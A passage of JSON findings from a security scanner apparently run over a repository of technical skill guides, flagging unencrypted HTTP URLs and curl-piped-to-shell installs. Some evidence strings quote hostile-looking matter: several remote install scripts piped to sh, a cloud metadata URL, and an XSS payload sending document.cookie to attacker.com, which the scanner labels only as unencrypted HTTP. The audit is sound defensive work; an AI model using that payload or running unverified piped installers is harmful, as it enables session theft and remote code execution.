        "line_number": 135,
        "issue": "Pipe curl to shell",
        "evidence": "curl https://get.acme.sh | sh",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals.md",
        "line_number": 243,
        "issue": "Unencrypted HTTP",
        "evidence": "-url http://ocsp.example.com -CAfile ca-cert.pem",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 1978,
        "issue": "Unencrypted HTTP",
        "evidence": "signtool sign /f \"pkcs11:object=CodeSigningKey\" /fd SHA256 /tr http://timestamp.digicert.com application.exe",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
        "line_number": 373,
        "issue": "Unencrypted HTTP",
        "evidence": "- [PKCS#11 Specification](http://docs.oasis-open.org/pkcs11/pkcs11-base/v2.40/pkcs11-base-v2.40.html)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 203,
        "issue": "Unencrypted HTTP",
        "evidence": "- OCSP: http://ocsp.letsencrypt.org",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 204,
        "issue": "Unencrypted HTTP",
        "evidence": "- CA Issuers: http://cert.letsencrypt.org/letsencryptauthorityx3.der",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 209,
        "issue": "Unencrypted HTTP",
        "evidence": "URI: http://crl.example.com/crl.pem",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 863,
        "issue": "Pipe curl to shell",
        "evidence": "curl https://get.acme.sh | sh",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 1194,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 1352,
        "issue": "Unencrypted HTTP",
        "evidence": "wget http://crl.example.com/crl.pem",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 1387,
        "issue": "Unencrypted HTTP",
        "evidence": "-url http://ocsp.letsencrypt.org -resp_text",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 364,
        "issue": "Unencrypted HTTP",
        "evidence": "signtool sign /f certificate.pfx /p password /t http://timestamp.digicert.com myapp.exe",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1291,
        "issue": "Unencrypted HTTP",
        "evidence": "/t http://timestamp.digicert.com `",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1299,
        "issue": "Unencrypted HTTP",
        "evidence": "/t http://timestamp.digicert.com `",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1304,
        "issue": "Unencrypted HTTP",
        "evidence": "signtool sign /f cert.pfx /p password /t http://timestamp.digicert.com /fd SHA1 myapp.exe",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1305,
        "issue": "Unencrypted HTTP",
        "evidence": "signtool sign /f cert.pfx /p password /tr http://timestamp.digicert.com /fd SHA256 /as myapp.exe",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1523,
        "issue": "Unencrypted HTTP",
        "evidence": "- **Sectigo**: http://timestamp.sectigo.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1524,
        "issue": "Unencrypted HTTP",
        "evidence": "- **GlobalSign**: http://timestamp.globalsign.com/tsa/r6advanced1",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 2002,
        "issue": "Unencrypted HTTP",
        "evidence": "<Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\">",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 2833,
        "issue": "Unencrypted HTTP",
        "evidence": "signtool sign /f cert.pfx /p password /t http://timestamp.digicert.com /fd SHA256 app.exe",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 2849,
        "issue": "Unencrypted HTTP",
        "evidence": "- Sectigo: http://timestamp.sectigo.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 2903,
        "issue": "Unencrypted HTTP",
        "evidence": "- **PKCS#11 Specification**: http://docs.oasis-open.org/pkcs11/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 226,
        "issue": "Unencrypted HTTP",
        "evidence": "crlDistributionPoints = URI:http://crl.example.com/root.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 227,
        "issue": "Unencrypted HTTP",
        "evidence": "authorityInfoAccess = OCSP;URI:http://ocsp.example.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 284,
        "issue": "Unencrypted HTTP",
        "evidence": "OCSP - URI:http://ocsp.example.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 285,
        "issue": "Unencrypted HTTP",
        "evidence": "CA Issuers - URI:http://ca.example.com/intermediate.crt",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 288,
        "issue": "Unencrypted HTTP",
        "evidence": "URI:http://crl.example.com/intermediate.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 368,
        "issue": "Unencrypted HTTP",
        "evidence": "OCSP - URI:http://ocsp.example.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 369,
        "issue": "Unencrypted HTTP",
        "evidence": "CA Issuers - URI:http://ca.example.com/intermediate.crt",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 374,
        "issue": "Unencrypted HTTP",
        "evidence": "URI:http://crl.example.com/intermediate.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 488,
        "issue": "Unencrypted HTTP",
        "evidence": "authorityInfoAccess = OCSP;URI:http://ocsp.example.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 489,
        "issue": "Unencrypted HTTP",
        "evidence": "crlDistributionPoints = URI:http://crl.example.com/intermediate.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 752,
        "issue": "Unencrypted HTTP",
        "evidence": "http://crl.example.com/intermediate.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 760,
        "issue": "Unencrypted HTTP",
        "evidence": "URI:http://crl.example.com/intermediate.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 822,
        "issue": "Unencrypted HTTP",
        "evidence": "-url http://ocsp.example.com \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1782,
        "issue": "Unencrypted HTTP",
        "evidence": "issuing_certificates=\"http://vault.example.com:8200/v1/pki/ca\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1783,
        "issue": "Unencrypted HTTP",
        "evidence": "crl_distribution_points=\"http://vault.example.com:8200/v1/pki/crl\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 2165,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -I http://crl.example.com/intermediate.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 2168,
        "issue": "Unencrypted HTTP",
        "evidence": "openssl ocsp -issuer ca.pem -cert cert.pem -url http://ocsp.example.com -CAfile ca.pem",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 2376,
        "issue": "Unencrypted HTTP",
        "evidence": "openssl ocsp -issuer ca.pem -cert cert.pem -url http://ocsp.example.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/secrets-rotation/resources/examples/07_emergency_rotation_runbook.md",
        "line_number": 383,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -s http://prometheus:9090/api/v1/query?query='up{job=\"myapp\"}' | jq '.data.result[].value[1]'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/tls-configuration/resources/REFERENCE.md",
        "line_number": 751,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/distributed-systems-debugging.md",
        "line_number": 122,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://inventory-service/api/reserve\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/distributed-systems-debugging.md",
        "line_number": 140,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://payment-service/api/charge\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/distributed-systems-debugging.md",
        "line_number": 148,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://inventory-service/api/release\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/distributed-systems-debugging.md",
        "line_number": 763,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.get(\"http://service-b/api/data\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/distributed-systems-debugging.md",
        "line_number": 768,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.get(\"http://service-b/api/data\", headers=headers)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/production-debugging.md",
        "line_number": 247,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -X POST http://api.example.com/admin/log-level \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/production-debugging.md",
        "line_number": 253,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -X POST http://api.example.com/admin/log-level \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/debugging/container-debugging.md",
        "line_number": 360,
        "issue": "Unencrypted HTTP",
        "evidence": "kubectl exec -it <pod_name> -- wget -O- http://service-name:8080/health",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/ml/llm-evaluation-frameworks.md",
        "line_number": 793,
        "issue": "Unencrypted HTTP",
        "evidence": "PHOENIX_ENDPOINT = os.getenv(\"PHOENIX_ENDPOINT\", \"http://phoenix:6006/v1/traces\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/build-systems/maven-configuration.md",
        "line_number": 29,
        "issue": "Unencrypted HTTP",
        "evidence": "<project xmlns=\"http://maven.apache.org/POM/4.0.0\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/build-systems/maven-configuration.md",
        "line_number": 30,
        "issue": "Unencrypted HTTP",
        "evidence": "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/build-systems/maven-configuration.md",
        "line_number": 31,
        "issue": "Unencrypted HTTP",
        "evidence": "xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/build-systems/maven-configuration.md",
        "line_number": 32,
        "issue": "Unencrypted HTTP",
        "evidence": "http://maven.apache.org/xsd/maven-4.0.0.xsd\">",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/vulnerability-assessment.md",
        "line_number": 430,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://169.254.169.254/latest/meta-data/\",  # AWS metadata",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/security-headers.md",
        "line_number": 267,
        "issue": "Unencrypted HTTP",
        "evidence": "url = request.url.replace('http://', 'https://', 1)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/security-headers.md",
        "line_number": 534,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/vulnerability-assessment/resources/REFERENCE.md",
        "line_number": 96,
        "issue": "Unencrypted HTTP",
        "evidence": "username: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/vulnerability-assessment/resources/REFERENCE.md",
        "line_number": 182,
        "issue": "Unencrypted HTTP",
        "evidence": "- http://www.pentest-standard.org/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/docker-compose-development.md",
        "line_number": 302,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://web:80",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/docker-compose-development.md",
        "line_number": 343,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://api:3000",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/docker-compose-development.md",
        "line_number": 344,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://api-server:3000",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/docker-compose-development.md",
        "line_number": 345,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://backend-api:3000",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/container-networking.md",
        "line_number": 69,
        "issue": "Unencrypted HTTP",
        "evidence": "docker exec web curl http://api:3000",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/container-networking.md",
        "line_number": 293,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://db:5432",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/container-networking.md",
        "line_number": 461,
        "issue": "Unencrypted HTTP",
        "evidence": "docker exec web curl http://api:3000/health",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/container-networking.md",
        "line_number": 503,
        "issue": "Unencrypted HTTP",
        "evidence": "**Symptom**: `curl https://google.com` works, `curl http://api` fails",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/production-incident-debugging.md",
        "line_number": 205,
        "issue": "Unencrypted HTTP",
        "evidence": "response = requests.post('http://inventory-service/check', headers=headers)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/production-incident-debugging.md",
        "line_number": 509,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.post('http://service-a/api')",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/production-incident-debugging.md",
        "line_number": 512,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.post('http://service-b/api')",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/opentelemetry-integration.md",
        "line_number": 159,
        "issue": "Unencrypted HTTP",
        "evidence": "endpoint: http://loki:3100/loki/api/v1/push",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/opentelemetry-integration.md",
        "line_number": 225,
        "issue": "Unencrypted HTTP",
        "evidence": "response = requests.get(f'http://auth-service/validate/{user_id}')",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/opentelemetry-integration.md",
        "line_number": 261,
        "issue": "Unencrypted HTTP",
        "evidence": "span_exporter = OTLPSpanExporter(endpoint=\"http://otel-collector:4317\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/opentelemetry-integration.md",
        "line_number": 268,
        "issue": "Unencrypted HTTP",
        "evidence": "OTLPMetricExporter(endpoint=\"http://otel-collector:4317\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/opentelemetry-integration.md",
        "line_number": 621,
        "issue": "Unencrypted HTTP",
        "evidence": "-Dotel.exporter.otlp.endpoint=http://otel-collector:4317 \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/opentelemetry-integration.md",
        "line_number": 642,
        "issue": "Unencrypted HTTP",
        "evidence": "export OTEL_EXPORTER_OTLP_ENDPOINT=http://otel-collector:4318",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/distributed-tracing.md",
        "line_number": 304,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://service-b/api/data\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/distributed-tracing.md",
        "line_number": 536,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.get(\"http://service-b/api/data\")  # Breaks trace!",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/distributed-tracing.md",
        "line_number": 541,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.get(\"http://service-b/api/data\", headers=headers)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/distributed-tracing/resources/REFERENCE.md",
        "line_number": 1721,
        "issue": "Unencrypted HTTP",
        "evidence": "response = requests.get(\"http://service-b/api\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/distributed-tracing/resources/REFERENCE.md",
        "line_number": 1730,
        "issue": "Unencrypted HTTP",
        "evidence": "response = requests.get(\"http://service-b/api\", headers=headers)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/prometheus-monitoring/resources/REFERENCE.md",
        "line_number": 3073,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://prometheus;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/prometheus-monitoring/resources/REFERENCE.md",
        "line_number": 3087,
        "issue": "Unencrypted HTTP",
        "evidence": "3. URL: `http://prometheus:9090`",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/metrics-instrumentation/resources/REFERENCE.md",
        "line_number": 2340,
        "issue": "Unencrypted HTTP",
        "evidence": "url: http://prometheus:9090",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/metrics-instrumentation/resources/REFERENCE.md",
        "line_number": 2476,
        "issue": "Unencrypted HTTP",
        "evidence": "1. Check target status: `http://prometheus:9090/targets`",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/metrics-instrumentation/resources/REFERENCE.md",
        "line_number": 2477,
        "issue": "Unencrypted HTTP",
        "evidence": "2. Verify metrics endpoint: `curl http://app:8080/metrics`",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 39,
        "issue": "Pipe curl to shell",
        "evidence": "curl -fsSL https://tailscale.com/install.sh | sh",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 158,
        "issue": "Unencrypted HTTP",
        "evidence": "response = requests.get(\"http://api-server:8000/data\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 201,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://172.17.0.2:8000",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 281,
        "issue": "Pipe curl to shell",
        "evidence": "RUN curl -fsSL https://tailscale.com/install.sh | sh",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 362,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://dev-server:3000    # React dev server",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 363,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://dev-server:8000    # Django backend",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/engineering/ci-cd-pipelines.md",
        "line_number": 654,
        "issue": "Pipe curl to shell",
        "evidence": "- curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/engineering/ci-cd-pipelines.md",
        "line_number": 664,
        "issue": "Pipe curl to shell",
        "evidence": "- curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/ci-cd-pipelines.md",
        "line_number": 773,
        "issue": "Unencrypted HTTP",
        "evidence": "- kubectl run curl-test --image=curlimages/curl --rm -it --restart=Never -- curl -f http://myapp-$NEW_COLOR.prod.svc.cluster.local/health",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/ci-cd-pipelines.md",
        "line_number": 1021,
        "issue": "Unencrypted HTTP",
        "evidence": "ERROR_RATE=\\$(curl -s http://prometheus:9090/api/v1/query?query=rate(http_requests_total{status=~\"5..\"}[5m]) | jq -r '.data.result[0].value[1]')",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies.md",
        "line_number": 189,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://myapp-green-preview/health",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts.md",
        "line_number": 281,
        "issue": "Unencrypted HTTP",
        "evidence": "curl 'http://prometheus:9090/api/v1/query?query=...'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts.md",
        "line_number": 390,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://alertmanager:9093/api/v1/alerts\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 69,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://api.example.com:9090/metrics | grep -E 'connection_pool_(active|idle|max)'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 134,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://api.example.com:9090/metrics | \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 142,
        "issue": "Unencrypted HTTP",
        "evidence": "curl \"http://prometheus:9090/api/v1/query?query=rate(http_requests_total[5m])\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 145,
        "issue": "Unencrypted HTTP",
        "evidence": "curl \"http://prometheus:9090/api/v1/query?query=rate(database_query_duration_seconds_sum[5m])\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 148,
